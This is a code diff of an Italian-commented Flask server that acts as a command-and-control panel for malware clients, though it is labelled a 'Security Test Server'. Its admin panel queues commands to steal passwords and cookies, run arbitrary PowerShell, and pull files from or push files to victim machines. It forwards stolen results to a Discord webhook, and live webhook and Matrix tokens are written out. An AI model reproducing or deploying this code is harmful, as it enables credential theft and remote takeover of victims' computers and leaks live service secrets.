@@ -6,14 +6,12 @@ import requests
 from datetime import datetime
 import os
 import hashlib
-import uuid
 
 app = Flask(__name__)
 
-# Configurazione
-MATRIX_WEBHOOK = "https://matrix.org/_matrix/client/r0/rooms/!skCsZdyGNtJBgEQDDL:matrix.org/send/m.room.message"
-MATRIX_TOKEN = "mat_PBtLmBg36QnnRHbgIxNeG4EPWSIojv_j6MFr2"
-CURRENT_VERSION = "1.1.0"  # 🆕 Versione per auto-update
+# Configurazione Discord
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"
+CURRENT_VERSION = "1.2.0"
 
 class ClientManager:
     def __init__(self):
@@ -21,20 +19,18 @@ class ClientManager:
         self.next_client_id = 1
         self.lock = threading.Lock()
         self.commands_queue = {}
-        self.client_fingerprints = {}  # 🆕 Fingerprinting
+        self.client_fingerprints = {}
     
     def generate_fingerprint(self, client_data, ip_address):
-        """🆕 Genera fingerprint unico per device"""
+        """Genera fingerprint unico per device"""
         fingerprint_str = f"{client_data.get('hostname','')}{ip_address}{client_data.get('username','')}"
         return hashlib.md5(fingerprint_str.encode()).hexdigest()
     
     def add_client(self, client_data, ip_address):
         with self.lock:
-            # 🆕 Check se device già esiste
             fingerprint = self.generate_fingerprint(client_data, ip_address)
             
             if fingerprint in self.client_fingerprints:
-                # Device già connesso - riusa ID
                 client_id = self.client_fingerprints[fingerprint]
                 self.clients[client_id] = {
                     "data": client_data,
@@ -44,7 +40,6 @@ class ClientManager:
                 }
                 return client_id
             else:
-                # Nuovo device
                 client_id = self.next_client_id
                 self.clients[client_id] = {
                     "data": client_data,
@@ -88,29 +83,33 @@ class ClientManager:
 
 client_manager = ClientManager()
 
-def send_to_matrix(message, data_type="SERVER"):
+def send_to_discord(message, data_type="SERVER"):
+    """Invia notifiche a Discord"""
     try:
         payload = {
-            "msgtype": "m.text",
-            "body": f"[{data_type}] {message}"
+            "content": f"🔐 **[{data_type}]** {message}",
+            "username": "SecurityBot",
+            "avatar_url": "https://cdn-icons-png.flaticon.com/512/6001/6001368.png"
         }
         headers = {
-            "Authorization": f"Bearer {MATRIX_TOKEN}",
             "Content-Type": "application/json"
         }
-        requests.post(MATRIX_WEBHOOK, json=payload, headers=headers, timeout=10)
+        response = requests.post(DISCORD_WEBHOOK, json=payload, headers=headers, timeout=10)
+        return response.status_code == 204
     except Exception as e:
-        print(f"Matrix error: {e}")
+        print(f"Discord error: {e}")
+        return False
 
 @app.route('/')
 def home():
     clients_count = len(client_manager.list_clients())
     return f"""
     <h1>Security Test Server v{CURRENT_VERSION}</h1>
-    <p>PythonAnywhere + Matrix</p>
+    <p>PythonAnywhere + Discord</p>
     <p>Client connessi: {clients_count}</p>
     <p><a href="/admin">Admin Panel</a></p>
-    <p><a href="/clients">View Clients</a></p>
+    <p><a href="/upload_files">Upload Files to Clients</a></p>
+    <p><a href="/api/clients">API Clients</a></p>
     """
 
 @app.route('/admin')
@@ -134,9 +133,7 @@ def admin_panel():
         <select name="command">
             <option value="passwords">Get Passwords</option>
             <option value="cookies">Get Cookies</option>
-            <option value="cards">Get Credit Cards</option>
             <option value="systeminfo">System Info</option>
-            <option value="screenshot">Screenshot</option>
         </select><br><br>
         
         <button type="submit">Send Command</button>
@@ -165,10 +162,11 @@ def admin_panel():
         <label>File Path:</label>
         <input type="text" name="file_path" placeholder="C:\path\to\file.txt" style="width: 300px;"><br><br>
         
-        <button type="submit">Download File</button>
+        <button type="submit">Download File from Client</button>
     </form>
 
-    <p><a href="/clients">View All Clients</a></p>
+    <p><a href="/upload_files">📤 Upload Files to Clients</a></p>
+    <p><a href="/api/clients">View All Clients (JSON)</a></p>
     '''
 
 @app.route('/send_command', methods=['POST'])
@@ -178,7 +176,7 @@ def send_command_web():
     
     if client_id and command:
         client_manager.add_command(int(client_id), command)
-        send_to_matrix(f"🌐 Comando web '{command}' per client {client_id}")
+        send_to_discord(f"🌐 Comando web '{command}' per client {client_id}")
     
     return f'''
     <h3>Command Sent!</h3>
@@ -188,15 +186,13 @@ def send_command_web():
 
 @app.route('/send_powershell', methods=['POST'])
 def send_powershell():
-    """🆕 Endpoint per comandi PowerShell arbitrari"""
     client_id = request.form.get('client_id')
     powershell_command = request.form.get('powershell_command')
     
     if client_id and powershell_command:
-        # 🆕 Prefisso per identificare comandi PowerShell live
         command = f"powershell_live:{powershell_command}"
         client_manager.add_command(int(client_id), command)
-        send_to_matrix(f"⚡ PowerShell: {powershell_command[:100]}... per client {client_id}")
+        send_to_discord(f"⚡ PowerShell: {powershell_command[:100]}... per client {client_id}")
     
     return f'''
     <h3>PowerShell Command Sent!</h3>
@@ -207,14 +203,13 @@ def send_powershell():
 
 @app.route('/download_file', methods=['POST'])
 def download_file():
-    """🆕 Endpoint per download file da client"""
     client_id = request.form.get('client_id')
     file_path = request.form.get('file_path')
     
     if client_id and file_path:
         command = f"download_file:{file_path}"
         client_manager.add_command(int(client_id), command)
-        send_to_matrix(f"📥 Download richiesto: {file_path} da client {client_id}")
+        send_to_discord(f"📥 Download richiesto: {file_path} da client {client_id}")
     
     return f'''
     <h3>Download Request Sent!</h3>
@@ -223,7 +218,6 @@ def download_file():
     <a href="/admin">Back to Admin</a>
     '''
 
-# 🆕 Endpoint per upload file
 @app.route('/api/upload_file', methods=['POST'])
 def upload_file():
     """Riceve file uploadati dal client"""
@@ -242,40 +236,28 @@ def upload_file():
         
         file.save(os.path.join(uploads_dir, safe_filename))
         
-        send_to_matrix(f"📤 File uploadato da client {client_id}: {safe_filename}")
+        send_to_discord(f"📤 File uploadato da client {client_id}: {safe_filename}")
         
         return jsonify({"status": "success", "message": f"File {safe_filename} uploaded"})
         
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
-# 🆕 Endpoint per auto-update
 @app.route('/api/check_update', methods=['GET'])
 def check_update():
-    """Client checka se ci sono aggiornamenti"""
     client_version = request.args.get('version', '1.0.0')
     
     if client_version != CURRENT_VERSION:
         return jsonify({
             "status": "update_available",
             "current_version": CURRENT_VERSION,
-            "message": "New version available",
-            "download_url": f"https://PythonEnjoyer291.eu.pythonanywhere.com/downloads/client_v{CURRENT_VERSION}.exe"
+            "message": "New version available"
         })
     else:
         return jsonify({
             "status": "up_to_date", 
             "message": "Client is up to date"
         })
-
-# 🆕 Endpoint per download nuovo EXE
-@app.route('/downloads/<path:filename>')
-def download_exe(filename):
-    """Serve il nuovo EXE per l'update"""
-    try:
-        return send_file(f"downloads/{filename}", as_attachment=True)
-    except:
-        return "File not found", 404
 
 @app.route('/api/register', methods=['POST'])
 def register_client():
@@ -284,7 +266,7 @@ def register_client():
         client_ip = request.remote_addr
         client_id = client_manager.add_client(client_data, client_ip)
         
-        send_to_matrix(f"🟢 Client {client_id} registrato - {client_data.get('hostname', 'Unknown')}")
+        send_to_discord(f"🟢 Client {client_id} registrato - {client_data.get('hostname', 'Unknown')}")
         
         return jsonify({
             "status": "success",
@@ -321,8 +303,11 @@ def receive_results():
         command = data.get('command')
         results = data.get('results')
         
-        send_to_matrix(f"📊 Risultati da client {client_id} - {command}:\n{str(results)[:500]}...")
+        # Invia risultati a Discord (primi 1500 caratteri per limiti Discord)
+        results_preview = str(results)[:1500]
+        send_to_discord(f"📊 Risultati da client {client_id} - {command}:\n```{results_preview}```")
         
+        # Salva risultati completi
         filename = f"results_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
         with open(filename, 'w') as f:
             json.dump(data, f, indent=2)
@@ -349,7 +334,6 @@ def list_clients():
 
 @app.route('/api/available_files', methods=['GET'])
 def available_files():
-    """Lista file disponibili per l'upload ai client"""
     try:
         files_dir = "uploads"
         available = []
@@ -368,7 +352,6 @@ def available_files():
 
 @app.route('/api/download_file/<filename>', methods=['GET'])
 def download_file_server(filename):
-    """Serve file ai client per l'upload"""
     try:
         safe_filename = os.path.basename(filename)
         return send_file(f"uploads/{safe_filename}", as_attachment=True)
@@ -377,7 +360,6 @@ def download_file_server(filename):
 
 @app.route('/upload_files')
 def upload_files_interface():
-    """Interfaccia per upload file ai client"""
     clients = client_manager.list_clients()
     clients_html = ""
     for client_id, info in clients.items():
@@ -411,7 +393,6 @@ def upload_files_interface():
 
 @app.route('/send_upload_command', methods=['POST'])
 def send_upload_command():
-    """Invia comando upload al client"""
     client_id = request.form.get('client_id')
     filename = request.form.get('filename')
     destination = request.form.get('destination')
@@ -419,7 +400,7 @@ def send_upload_command():
     if client_id and filename and destination:
         command = f"upload_file:{filename}:{destination}"
         client_manager.add_command(int(client_id), command)
-        send_to_matrix(f"📤 Upload richiesto: {filename} → {destination} su client {client_id}")
+        send_to_discord(f"📤 Upload richiesto: {filename} → {destination} su client {client_id}")
     
     return f'''
     <h3>Upload Command Sent!</h3>
@@ -431,9 +412,8 @@ def send_upload_command():
     
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    # Crea cartelle necessarie
     os.makedirs("uploads", exist_ok=True)
     os.makedirs("downloads", exist_ok=True)
     
-    send_to_matrix(f"🚀 Server Advanced v{CURRENT_VERSION} avviato")
+    send_to_discord(f"🚀 Server v{CURRENT_VERSION} avviato su PythonAnywhere")
     app.run(host='0.0.0.0', port=port, debug=False)
